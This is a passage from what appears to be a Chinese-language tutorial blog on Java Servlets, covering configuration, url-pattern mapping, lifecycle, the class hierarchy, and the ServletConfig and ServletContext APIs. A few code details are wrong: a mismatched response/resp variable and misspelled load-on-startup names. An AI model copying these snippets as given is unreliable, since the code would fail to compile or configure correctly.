<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>jakarta.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jakarta.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>或：文件 ==》项目结构==》依赖 &#x3D;=》+ &#x3D;&#x3D;》库 &#x3D;&#x3D;》Tomcat</p>
<h3 id="2、创建servlet类，实现HttpServlet接口，重写service方法"><a href="#2、创建servlet类，实现HttpServlet接口，重写service方法" class="headerlink" title="2、创建servlet类，实现HttpServlet接口，重写service方法"></a>2、创建servlet类，实现HttpServlet接口，重写service方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 1. 从request对象中获取请求中的任何信息（username参数）</span></span><br><span class="line">        <span class="comment">//    根据参数名获取参数值，无论参数是在url?后还是请求体中均可</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="comment">// 2. 处理业务代码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> <span class="string">&quot;YES&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>.equals(username))&#123;</span><br><span class="line">            info=<span class="string">&quot;NO&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3. 将响应数据放入response  </span></span><br><span class="line">        <span class="comment">// 应该设置Context-type</span></span><br><span class="line">        <span class="comment">// response.setHeader(&quot;Content-type&quot;,&quot;text/html&quot;); 可以直接使用对应api如下</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="comment">//    该方法返回一个向响应体中打印字符串的打印流</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        writer.write(info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="3、配置web-xml"><a href="#3、配置web-xml" class="headerlink" title="3、配置web.xml"></a>3、配置web.xml</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">	配置servlet类，并取别名</span></span><br><span class="line"><span class="comment">	servlet-name: 别名,用于关联请求的映射路径</span></span><br><span class="line"><span class="comment">	servlet-class: 向Tomcat说明对应的需要实例化的servlet类</span></span><br><span class="line"><span class="comment">	url-pattern: 用于定义Servlet或其他组件（如过滤器）能够响应的URL模式。当用户通过浏览器访问服务器上的资源时，服务器会根据请求的URL来匹配web.xml中定义的url-pattern，从而确定哪个Servlet应该处理该请求。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>userServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.fu.servlet.UserServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>userServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/userServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="特别说明"><a href="#特别说明" class="headerlink" title="特别说明"></a>特别说明</h3><h4 id="servlet-api-jar-的导入"><a href="#servlet-api-jar-的导入" class="headerlink" title="servlet-api.jar 的导入"></a>servlet-api.jar 的导入</h4><p>应当通过 文件 &#x3D;=》项目结构 &#x3D;&#x3D;》依赖导入，而不是通过maven的pom文件导入。</p>
<p>servlet-api 仅在编码是需要，运行时在服务器环境中，由服务器软件（Tomcat）提供，因此，在JavaWeb项目中，在打包和构建时，无需携带servlet-api的jar包。</p>
<p>Tomcat的lib目录下已经有此依赖，通过第一种方式引入的依赖作用范围为provided，即不将此依赖打包到最后的成果中。如果通过maven引入，可能会使得运行环境（Tomcat服务器）的servlet-api.jar版本与导入的不一致。</p>
<h4 id="Content-type-响应头"><a href="#Content-type-响应头" class="headerlink" title="Content-type 响应头"></a>Content-type 响应头</h4><p>MIME类型响应头：用于向客户端说明相应的数据是什么类型，客户端根据此类型采取对应的解析。默认使用HTML解析方式。</p>
<p>当Tomcat向服务器端发送静态资源时，会根据资源的后缀，在配置文件web.xml中找到其对应的MIME类型，生成Content-type。而请求动态资源时，就需要我们在servlet类中设置Content-type。</p>
<p><code> response.setContentType(&quot;text/html&quot;);</code></p>
<h4 id="url-pattern标签"><a href="#url-pattern标签" class="headerlink" title="url-pattern标签"></a>url-pattern标签</h4><p>以<code>http://localhost:8080/demo/se1</code>为例，<code>localhost</code>确定主机，<code>8080</code>确定Tomcat应用服务器，<code>demo</code>确定webapps中部署的demo项目。Tomcat根据<code>se1</code>查找web.xml中对应的的url-pattern标签，找到此标签对应的别名标签servlet-name，再通过别名标签找到对应的servlet-class标签，从而得知动态实现servlet类，最后通过反射执行对应的代码。</p>
<p>一个<code>servlet-class</code></p>
<ul>
<li>可以对应多个<code>servlet-name</code>从而对应多个<code>url-pattern</code>（不建议）</li>
<li>可以对应一个<code>servlet-name</code>从而对应多个<code>url-pattern</code>（不建议）</li>
<li>的父标签servlet可以对应多个servlet-maping标签。  （不建议）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;userServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.fu.servlet.UserServlet&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;userServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/userServlet&lt;/url-pattern&gt;</span><br><span class="line">    &lt;url-pattern&gt;/user&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;userServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/us&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure>



<p>以上显示的是url-pattern的精确写法，必须与url-pattern的内容一致才可访问对应资源。</p>
<p><strong>url-pattern的模糊匹配写法：</strong>（不建议）</p>
<ul>
<li><code>*</code>：通配符，*在哪，那就模糊<ul>
<li><code>/</code>：匹配除jsp文件以外的所有文件</li>
<li><code>/*</code>：匹配包含jsp文件的所有文件</li>
<li><code>/a/*</code>：匹配前缀，url只要以&#x2F;a&#x2F;开头，后续任意层均可，如&#x2F;a&#x2F;a&#x2F;c&#x2F;s</li>
<li><code>*.action</code>：匹配后缀，只要以.action结尾均可</li>
</ul>
</li>
</ul>
<h3 id="注解开发"><a href="#注解开发" class="headerlink" title="注解开发"></a>注解开发</h3><p>在servlet类前添加注解<code>@WebServlet(&quot;url-pattern&quot;)</code>即可取代web.xml中的<code>servlet</code>和<code>servlet-mapping</code>标签，其中url-pattern即原url-pattern标签的内容，如上述servlet类可以如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/userServlet&quot;)</span></span><br><span class="line"><span class="comment">// @WebServlet(name =&quot;userServlet&quot; value = &quot;/userServlet&quot;) </span></span><br><span class="line"><span class="comment">// 同时设置别名和映射，映射还可以使用urlPatterns属性，与value等效</span></span><br><span class="line"><span class="comment">// 也可以设置多个映射，使用,分隔</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注解配置和xml配置方式只能二选一</strong></p>
<h2 id="Servlet生命周期"><a href="#Servlet生命周期" class="headerlink" title="Servlet生命周期"></a>Servlet生命周期</h2><p><code>重点：不建议在service方法中修改成员变量</code></p>
<p>Servlet类会经历四个阶段</p>
<ol>
<li>实例化 &#x3D;&#x3D;》构造器，每个生命周期只执行一次，在第一次请求时执行</li>
<li>初始化 &#x3D;&#x3D;》init方法，每个生命周期只执行一次，在构造器执行后时执行</li>
<li>接收、处理请求（提供服务）&#x3D;&#x3D;》 service方法，每个生命周期执行多次，每次收到请求都会执行</li>
<li>销毁 &#x3D;&#x3D;》destroy方法，每个生命周期只执行一次，关闭服务时执行</li>
</ol>
<p>servlet在Tomcat中是单例的，当多个客户端同时发送相同请求时（并发），Tomcat会针对每个请求创建一个线程栈，每个线程栈压入一个service方法。同时servlet对象存储在进程堆中，包含对象的属性等，这些时多个线程共享的。如果在service方法中堆成员变量（即对象属性）做出修改，将会影响到堆中数据，多个线程中获取的成员变量可能会出现错误，引发<strong>线程安全问题</strong>，因此<strong>不建议在service方法中修改成员变量。</strong></p>
<p>一般情况下，servlet类在第一次请求时被实例化，但也可以设置在Tomcat启动时立即进行实例化，这就需要在注解中添加属性<code>loadOnStartUp</code>，或在<code>&lt;servlet</code>标签下添加子标签<code>load-on-start-up</code>，其取值为</p>
<ul>
<li><code>-1</code>：表示不在启动时实例化</li>
<li><code>正整数</code>：表示第几个被实例化，可以不连续，可以重复，重复时自动协调。（不建议设置小于6的）</li>
</ul>
<h3 id="Tomcat处理请求流程："><a href="#Tomcat处理请求流程：" class="headerlink" title="Tomcat处理请求流程："></a><strong>Tomcat处理请求流程：</strong></h3><p>以<code>http://localhost:8080/demo/se1</code>为例，<code>localhost</code>确定主机，<code>8080</code>确定Tomcat应用服务器，<code>demo</code>确定webapps中部署的demo项目。Tomcat根据<code>se1</code>查找web.xml中对应的的url-pattern标签，找到此标签对应的别名标签servlet-name，再通过别名标签找到对应的servlet-class标签，从而得知动态实现servlet类，最后通过反射执行对应的代码。如果<code>se1</code>没有对应的servlet类，说明请求的是静态资源，交给内部的<code>defaultServlet</code>类处理，此类将在资源目录中查找静态文件并将其读入程序，以Io流的形式写入Response并根据文件情况写响应头。SpringMVC中defaultServlet默认是失效的，因此如果需要访问静态资源，还需要开启。</p>
<hr>
<h2 id="Servlet继承结构"><a href="#Servlet继承结构" class="headerlink" title="Servlet继承结构"></a>Servlet继承结构</h2><h3 id="1、顶级接口Servlet"><a href="#1、顶级接口Servlet" class="headerlink" title="1、顶级接口Servlet"></a>1、顶级接口Servlet</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">    <span class="comment">// 初始化方法，构造完毕后，由Tomcat自动调用完成初始化功能的方法</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig var1)</span> <span class="keyword">throws</span> ServletException;</span><br><span class="line">	<span class="comment">// 获取ServletConfig对象的方法，ServletConfig对象存储了web.xml中的配置信息</span></span><br><span class="line">    ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>;</span><br><span class="line">	<span class="comment">// 接收用户请求，向用户响应信息的方法</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest var1, ServletResponse var2)</span> <span class="keyword">throws</span> ServletException, IOException;</span><br><span class="line">	<span class="comment">// 返回Servlet字符串形式描述信息的方法</span></span><br><span class="line">    String <span class="title function_">getServletInfo</span><span class="params">()</span>;</span><br><span class="line">	<span class="comment">// Servlet在回收前，由Tomcat调用的销毁方法，常常用于进行资源释放</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2、Servlet接口的抽象实现类GenericServlet"><a href="#2、Servlet接口的抽象实现类GenericServlet" class="headerlink" title="2、Servlet接口的抽象实现类GenericServlet"></a>2、Servlet接口的抽象实现类GenericServlet</h3><p>侧重除service方法以外的其他方法的基础处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">GenericServlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span>, ServletConfig, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> ServletConfig config;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 将抽象方法重写为普通方法，内部没有实现代码（平铺实现）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	...</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 返回ServletConfig</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.config;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  	...</span><br><span class="line">      </span><br><span class="line">    <span class="comment">// Tomcat调用init方法时，会读取配置信息到ServletConfig对象并将其传入init方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="comment">// 将config对象存储为当前属性</span></span><br><span class="line">        <span class="built_in">this</span>.config = config;</span><br><span class="line">        <span class="comment">// 调用重载的无参的init，因此用户无需处理config，直接重写无参init方法即可</span></span><br><span class="line">        <span class="built_in">this</span>.init();</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 用户重写的无参init方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">       </span><br><span class="line">	<span class="comment">// 在此抽象声明service方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest var1, ServletResponse var2)</span> <span class="keyword">throws</span> ServletException, IOException;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="3、GenericServlet的抽象继承类HttpServlet"><a href="#3、GenericServlet的抽象继承类HttpServlet" class="headerlink" title="3、GenericServlet的抽象继承类HttpServlet"></a>3、GenericServlet的抽象继承类HttpServlet</h3><p>侧重service方法的处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">HttpServlet</span> <span class="keyword">extends</span> <span class="title class_">GenericServlet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 参数父转子，</span></span><br><span class="line">        HttpServletRequest request;</span><br><span class="line">        HttpServletResponse response;</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">// 调用重载的service</span></span><br><span class="line">        <span class="built_in">this</span>.service(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    	<span class="comment">// 获取请求方式 GET POST 等</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> req.getMethod();</span><br><span class="line">        <span class="type">long</span> lastModified;</span><br><span class="line">        <span class="comment">// 根据请求方式调用对应的do方法,do方法内部均会故意响应405</span></span><br><span class="line">        <span class="keyword">if</span> (method.equals(<span class="string">&quot;GET&quot;</span>)) &#123;</span><br><span class="line">            lastModified = <span class="built_in">this</span>.getLastModified(req);</span><br><span class="line">            <span class="keyword">if</span> (lastModified == -<span class="number">1L</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.doGet(req, resp);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">&quot;HEAD&quot;</span>)) &#123;</span><br><span class="line">            lastModified = <span class="built_in">this</span>.getLastModified(req);</span><br><span class="line">            <span class="built_in">this</span>.maybeSetLastModified(resp, lastModified);</span><br><span class="line">            <span class="built_in">this</span>.doHead(req, resp);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">&quot;POST&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.doPost(req, resp);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">&quot;PUT&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.doPut(req, resp);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">&quot;DELETE&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.doDelete(req, resp);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">&quot;OPTIONS&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.doOptions(req, resp);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">&quot;TRACE&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.doTrace(req, resp);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="HttpServlet的继承实现类-自定义的servlet类"><a href="#HttpServlet的继承实现类-自定义的servlet类" class="headerlink" title="HttpServlet的继承实现类-自定义的servlet类"></a>HttpServlet的继承实现类-自定义的servlet类</h3><p>在自定义的servlet类中，如果不对service方法进行重写，Tomcat将会调用父类HttpServlet的service方法，而父类中service方法调用的每一个do方法都会返回405响应码，即请求方法不支持。因此我们也可以重写各个do方法，实现业务逻辑。但后续使用SpringMVC后，我们无需再继承HttpServlet，处理请求的方法也不再是do*方法</p>
<hr>
<h2 id="ServletConfig和ServletContext"><a href="#ServletConfig和ServletContext" class="headerlink" title="ServletConfig和ServletContext"></a>ServletConfig和ServletContext</h2><h3 id="ServletConfig"><a href="#ServletConfig" class="headerlink" title="ServletConfig"></a>ServletConfig</h3><p>为Servlet提供初始配置参数的一种对象，每个Servlet都有自己独立唯一的ServletConfig对象；容器会为每一个Servlet实例化一个ServletConfig对象，并通过Servlet生命周期的init方法传入给Servlet作为属性。</p>
<p>Tomcat启动后，读取每一个web.xml配置文件，根据servlet的数量实例化对应数量的servletconfig对象，将每个<code>&lt;servlet&gt;</code>标签下子标签<code>&lt;init-param&gt;</code>的参数以键值对形式作为属性，传递给对应ServletConfig对象。</p>
<p>查看参数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletConfig</span> <span class="variable">config</span> <span class="operator">=</span> getServletConfig();</span><br><span class="line"><span class="comment">// 获取所有初始参数名称</span></span><br><span class="line">Enumeration&lt;String&gt; names = config.getInitParameterNames();</span><br><span class="line"><span class="comment">// 根据参数名获取参数值</span></span><br><span class="line"><span class="type">String</span> <span class="variable">keya</span> <span class="operator">=</span> config.getInitParameter(<span class="string">&quot;keya&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;keya = &quot;</span> + keya );</span><br><span class="line"><span class="comment">// 遍历参数</span></span><br><span class="line"><span class="keyword">while</span> (names.hasMoreElements())&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">element</span> <span class="operator">=</span> names.nextElement();</span><br><span class="line">    <span class="type">String</span> <span class="variable">parameter</span> <span class="operator">=</span> getInitParameter(element);</span><br><span class="line">    System.out.println(element+<span class="string">&quot; = &quot;</span>+parameter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应XML配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>userServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.fu.servlet.UserServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--只有init-param才作为参数--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>keya<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>valuea<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>keyb<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>valueb<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>或相当于注解配置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(</span></span><br><span class="line"><span class="meta">        urlPatterns = &quot;/aaa&quot;,</span></span><br><span class="line"><span class="meta">        initParams = &#123;@WebInitParam(name = &quot;keya&quot;,value = &quot;valuea&quot;),@WebInitParam(name = &quot;keyb&quot;,value = &quot;valueb&quot;)&#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br></pre></td></tr></table></figure>





<h3 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h3><p>ServletContext对象又称为上下文对象或应用域对象，容器会为<strong>每一个APP</strong>创建一个独立唯一的Servlet Context对象（单例模式，获取几次都是同一个对象），为<strong>所有Servlet共享</strong>，为所有servlet提供初始配置参数。</p>
<p>配置context参数：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;https://jakarta.ee/xml/ns/jakartaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;https://jakarta.ee/xml/ns/jakartaee https://jakarta.ee/xml/ns/jakartaee/web-app_5_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;5.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>username<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>lihua<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>相当于注解：</p>
<p>查询参数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> getServletContext();</span><br><span class="line"><span class="comment">// 等价于：</span></span><br><span class="line"><span class="type">ServletConfig</span> <span class="variable">config</span> <span class="operator">=</span> getServletConfig();</span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">context1</span> <span class="operator">=</span> config.getServletContext();</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">context2</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"><span class="comment">// 三者获取的是同一个对象</span></span><br><span class="line"><span class="type">String</span> <span class="variable">encoding</span> <span class="operator">=</span> context.getInitParameter(<span class="string">&quot;encoding&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;encoding=&quot;</span>+encoding);</span><br><span class="line">Enumeration&lt;String&gt; names = context.getInitParameterNames();</span><br><span class="line"><span class="keyword">while</span> (names.hasMoreElements())&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">e</span> <span class="operator">=</span> names.nextElement();</span><br><span class="line">    System.out.println(e+<span class="string">&quot;=&quot;</span>+context.getInitParameter(e));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="常用API"><a href="#常用API" class="headerlink" title="常用API"></a>常用API</h4><p><strong>获取路径的常用API</strong>如下：</p>
<ul>
<li><code>getRealPath()</code>：获取指向项目部署位置下某个文件&#x2F;目录的真实磁盘路径</li>
<li><code>getContextPath()</code>：获取项目部署的上下文路径，即项目的访问路径</li>
</ul>
<p>使用示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 向upload目录中写入一个文件，如果path为固定路径，则部署后无法在其他平台使用</span></span><br><span class="line"><span class="comment">// 这就需要context</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> getServletContext();</span><br><span class="line"><span class="comment">// API获取指向项目部署位置下某个文件/目录的真实磁盘路径</span></span><br><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> context.getRealPath(<span class="string">&quot;upload&quot;</span>);</span><br><span class="line">System.out.println(path);</span><br><span class="line"><span class="comment">// API获取项目部署的上下文路径，即项目的访问路径</span></span><br><span class="line"><span class="comment">// 可以生成查找目标资源的绝对路径</span></span><br><span class="line"><span class="type">String</span> <span class="variable">contextPath</span> <span class="operator">=</span> context.getContextPath();</span><br><span class="line">System.out.println(contextPath);</span><br></pre></td></tr></table></figure>



<p>域对象：一些用于存储数据和传递数据的对象，传递数据不同的范围，称不同的域。不同域对象代表不同域，共享的数据范围也不同。ServletContext代表应用，所以Servlet Context域也称为应用域，可以在本应用内实现数据共享和传递。WebAPP中有三大域对象，分别是应用域，会话域，请求域。</p>
<p><strong>域对象的常用API</strong>：</p>
<ul>
<li><code>setAttribute(String key, Object value)</code>：向域中存储&#x2F;修改数据</li>
<li><code>Object getAttribute(String key)</code>：从域中获取数据</li>
<li><code>removeAttribute(String key)</code>：从域中删除信息。</li>
</ul>
<p>向ServletContext域中存储的数据，可以被同一应用的其他servlet类读取。</p>
<p>使用：</p>
